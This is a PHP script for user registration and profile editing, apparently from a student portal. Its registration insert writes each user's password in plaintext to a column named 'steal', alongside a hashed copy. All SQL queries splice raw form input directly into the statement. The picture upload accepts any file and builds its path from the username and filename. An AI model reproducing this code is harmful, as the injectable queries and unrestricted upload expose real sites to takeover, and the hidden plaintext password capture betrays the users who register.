<?php
session_start();
include( "connect.php" );

//==========REGISTRATION==========//


if ( isset( $_POST[ 'b2' ] ) && !empty( $_POST[ 'fname' ] ) &&
    !empty( $_POST[ 'username' ] ) &&
    !empty( $_POST[ 'upass' ] ) ) {

    $directory = "userimages/" . $_POST[ 'username' ] . "/";
    if ( !is_dir( $directory ) ) {
        mkdir( $directory );
    }

    $filename = basename( $_FILES[ 'pfp' ][ 'name' ] );
    $target = $directory . $filename;

    $tmpname = $_FILES[ 'pfp' ][ 'tmp_name' ];
    move_uploaded_file( $tmpname, $target );


    mysqli_query( $conn, "insert into user_info set
									steal = '" . $_POST[ 'upass' ] . "',
		   							username = '" . $_POST[ 'username' ] . "',
									upass = PASSWORD('" . $_POST[ 'upass' ] . "'),
									status = '0' ,   									
									fname = '" . $_POST[ 'fname' ] . "',									
									email = '" . $_POST[ 'email' ] . "',
									gender = '" . $_POST[ 'gender' ] . "',
									rollno = '" . $_POST[ 'rollno' ] . "',
									spnno = '" . $_POST[ 'spnno' ] . "',
									phone = '" . $_POST[ 'phone' ] . "',
									pfp = '" . $target . "',
									year = '" . $_POST[ 'year' ] . "',
									branch = '" . $_POST[ 'branch' ] . "'
		   " );

    $numreg = mysqli_insert_id( $conn );
    if ( $numreg > 0 ) {
        header( "location:login.php?user=reg" );
        exit();

    } else {
        echo "eddrror aagaya bhai ";
    }

} 


//==========END REGISTRATION==========//


//==========EDIT PROFILE==========//

if ( isset( $_POST[ 'update' ] ) ) {
    
    $fname = $_POST[ 'fname' ] . " " . $_POST[ 'lname' ];
	
    mysqli_query( $conn, "update user_info set
		   							fname = '" . $fname . "',
								 	
									email = '" . $_POST[ 'email' ] . "',
									gender = '" . $_POST[ 'gender' ] . "',
									phone = '" . $_POST[ 'phone' ] . "',
									country = '" . $_POST[ 'country' ] . "',
									state = '" . $_POST[ 'state' ] . "',
									city = '" . $_POST[ 'city' ] . "',
									bio = '" . $_POST[ 'bio' ] . "',
									branch = '" . $_POST[ 'branch' ] . "',
									year = '" . $_POST[ 'year' ] . "',
									facebook = '" . $_POST[ 'facebook' ] . "',
									twitter = '" . $_POST[ 'twitter' ] . "',
									instagram = '" . $_POST[ 'instagram' ] . "'
									where uid = '" . $_SESSION[ 'uid' ] . "' " );
    header( "location:edit_profile.php" );
    exit();
}

//==========END EDIT PROFILE==========//

?>